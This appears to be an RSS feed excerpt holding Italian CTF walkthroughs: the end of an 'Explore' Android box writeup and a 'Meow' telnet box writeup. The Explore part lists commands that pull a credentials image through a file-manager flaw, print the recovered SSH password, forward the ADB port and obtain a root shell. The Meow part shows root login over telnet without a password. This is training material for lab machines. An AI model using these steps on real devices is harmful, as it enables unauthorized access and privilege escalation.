+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.py --cmd GetDeviceInfo --ip &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore11.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.py listPics &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore12.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C’è un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.py getFile &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; /storage/emulated/0/DCIM/creds.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore13.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore14.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;Questo sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l’utente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh kristi@10.10.10.247 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore15.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;La flag user.txt si trova in /storage/emulated/0/user.txt:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore16.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;h1 id=&#34;privilage-escalation&#34;&gt;Privilage Escalation&lt;/h1&gt;
+&lt;p&gt;Avendo accesso all’host remoto tramite SSH, si può eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ss -ntpl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Poiché la porta 5555 è filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. sudo apt install adb
+2. adb --help
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nella sezione rete vediamo che utilizzando l’istruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb connect 127.0.0.1:5555
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore17.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;È possibile elencare i dispositivi collegati eseguendo il seguente comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb devices
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore18.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;Quindi, si può digitare quanto segue per ottenere la shell sulla macchina remota:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb -s 127.0.0.1 shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Digitiamo “su” per diventare utenti root:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore19.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;
+
+
+&lt;p&gt;Nella directory data vi sará la nostra flag:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore20.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>Walkthrough Meow</title>
+      <link>/posts/walkthrough-meow/walkthrough_meow_ctf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/walkthrough-meow/walkthrough_meow_ctf/</guid>
+      <description>Table Of Contents:
+ Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa è stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.
+Il comando é:
+nmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L&amp;rsquo;output:
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.</description>
+      <content>&lt;p&gt;Table Of Contents:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#connessione-a-telnet&#34;&gt;Connessione a Telnet&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+
+  &lt;img src=&#34;/images/LogoMeowCTF.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;
+
+
+&lt;h1 id=&#34;enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/h1&gt;
+&lt;p&gt;La primissima cosa è stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.&lt;/p&gt;
+&lt;p&gt;Il comando é:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sVC -n -A -Pn -p 22, 23, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;5000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L&amp;rsquo;output:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-11-24 22:45 CET
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.46.55
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.046s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;conn-refused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 16.50 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;connessione-a-telnet&#34;&gt;Connessione a Telnet&lt;/h1&gt;
+&lt;p&gt;Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.&lt;/p&gt;
+&lt;p&gt;Usa il comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt-get install telnet
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;se non lo hai installato o stai usando una VM, poi lanciamo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;telnet &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L&amp;rsquo;output sarà:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Meow1.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+
+  &lt;img src=&#34;/images/Meow2.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;Ci viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nell’attività precedente. Un utente root è in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto l’accesso.&lt;/p&gt;
+&lt;p&gt;Confermiamo nel terminale se siamo l’utente root.&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Meow3.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;Se elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt è elencato.&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Meow4.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+</content>
+    </item>
+    
+  </channel>
+</rss>
